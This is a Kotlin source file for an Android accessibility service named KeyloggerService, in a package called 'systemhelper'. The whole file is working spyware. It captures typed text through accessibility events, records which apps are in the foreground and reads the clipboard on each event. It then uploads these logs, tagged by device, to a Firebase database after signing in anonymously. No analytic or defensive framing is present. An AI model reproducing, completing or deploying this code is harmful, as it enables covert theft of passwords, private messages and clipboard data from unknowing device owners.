package com.systemhelper.keylogger

import android.accessibilityservice.AccessibilityService
import android.content.ClipboardManager
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.FirebaseApp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class KeyloggerService : AccessibilityService() {
    companion object {
        private const val TAG = "KeyloggerService"
    }

    private lateinit var clipboardManager: ClipboardManager
    private lateinit var firebaseDatabase: FirebaseDatabase
    private lateinit var firebaseAuth: FirebaseAuth
    private var lastClipboardText: String = ""
    private var deviceId: String? = null

    override fun onCreate() {
        super.onCreate()
        
        // Initialize Firebase
        FirebaseApp.initializeApp(this)
        
        // Initialize clipboard monitoring
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        
        // Initialize Firebase
        firebaseDatabase = FirebaseDatabase.getInstance()
        firebaseAuth = FirebaseAuth.getInstance()

        // Authenticate device
        authenticateDevice()
    }

    private fun authenticateDevice() {
        CoroutineScope(Dispatchers.IO).launch {
            firebaseAuth.signInAnonymously()
                .addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        deviceId = task.result?.user?.uid
                        Log.d(TAG, "Device authenticated: $deviceId")
                    } else {
                        Log.e(TAG, "Authentication failed", task.exception)
                    }
                }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Only log if device is authenticated
        if (deviceId == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> logKeystroke(event)
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> logActiveApp(event)
        }

        // Monitor clipboard
        monitorClipboard()
    }

    private fun logKeystroke(event: AccessibilityEvent) {
        try {
            val keystroke = event.text.toString()
            val packageName = event.packageName?.toString() ?: "Unknown"
            
            val logEntry = mapOf(
                "timestamp" to getCurrentTimestamp(),
                "keystroke" to LogEncryptor.encrypt(keystroke, deviceId!!),
                "app" to packageName
            )

            // Upload to Firebase
            firebaseDatabase.reference
                .child("keylog")
                .child(deviceId!!)
                .child(packageName)
                .push()
                .setValue(logEntry)
        } catch (e: Exception) {
            Log.e(TAG, "Error logging keystroke", e)
        }
    }

    private fun logActiveApp(event: AccessibilityEvent) {
        try {
            val activeApp = event.packageName?.toString() ?: "Unknown"
            
            val appLog = mapOf(
                "timestamp" to getCurrentTimestamp(),
                "activeApp" to activeApp
            )

            // Upload active app to Firebase
            firebaseDatabase.reference
                .child("keylog")
                .child(deviceId!!)
                .child("activeApps")
                .push()
                .setValue(appLog)
        } catch (e: Exception) {
            Log.e(TAG, "Error logging active app", e)
        }
    }

    private fun monitorClipboard() {
        try {
            if (clipboardManager.hasPrimaryClip()) {
                val currentClip = clipboardManager.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                
                if (currentClip != lastClipboardText) {
                    val clipboardLog = mapOf(
                        "timestamp" to getCurrentTimestamp(),
                        "clipboardText" to LogEncryptor.encrypt(currentClip, deviceId!!)
                    )

                    // Upload clipboard to Firebase
                    firebaseDatabase.reference
                        .child("keylog")
                        .child(deviceId!!)
                        .child("clipboard")
                        .push()
                        .setValue(clipboardLog)
                    
                    lastClipboardText = currentClip
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error monitoring clipboard", e)
        }
    }

    private fun getCurrentTimestamp(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected")
    }
} 